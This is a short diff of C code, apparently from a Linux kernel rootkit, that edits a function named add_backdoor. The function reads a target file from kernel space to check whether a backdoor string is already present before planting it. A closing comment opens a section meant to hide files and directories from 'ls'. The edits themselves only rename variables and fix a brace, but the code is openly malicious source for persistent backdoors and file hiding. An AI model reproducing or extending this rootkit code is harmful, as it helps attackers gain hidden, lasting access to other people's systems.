@@ -80,20 +80,20 @@ void add_backdoor(char *path) {
 	    	}
 
 	    	//check if backdoor already exists
-	    	buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
-	    	if(!buf){
+	    	if(!buffer){
 			goto cleanup1;
 	    	}
 
-	    	existing_backdoor = false;
+	    	backdoor_existing = false;
 	    	ret = PAGE_SIZE;
 	    	offset = 0;
 	    	while(ret == PAGE_SIZE){
 			offset = page_count*PAGE_SIZE;
 
 			set_fs(get_ds());
-			ret = vfs_read(file, buf, PAGE_SIZE, &offset);
+			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
 			set_fs(old_fs);
 
 			if(ret < 0){
@@ -102,13 +102,13 @@ void add_backdoor(char *path) {
 
 			page_count++;
 
-			if(strstr(buf, BACKDOOR)){
-			    existing_backdoor = true;
+			if(strstr(buffer, BACKDOOR)){
+			    backdoor_existing = true;
 			    break;
 			}
 	    	}
 
-	    	if(existing_backdoor){
+	    	if(backdoor_existing){
 			goto cleanup2;
 		    }
 
@@ -134,8 +134,8 @@ void add_backdoor(char *path) {
 	    	}
 
 		cleanup2:
-		    if(buf)
-			kfree(buf);
+		    if(buffer)
+			kfree(buffer);
 	
 		cleanup1:
 		    if(file)
@@ -144,7 +144,6 @@ void add_backdoor(char *path) {
 		exit:
 		    return;
 		}
-}
 // End Marc
 
 // START BRIAN - Hide files & directories from showing up when a user does "ls"
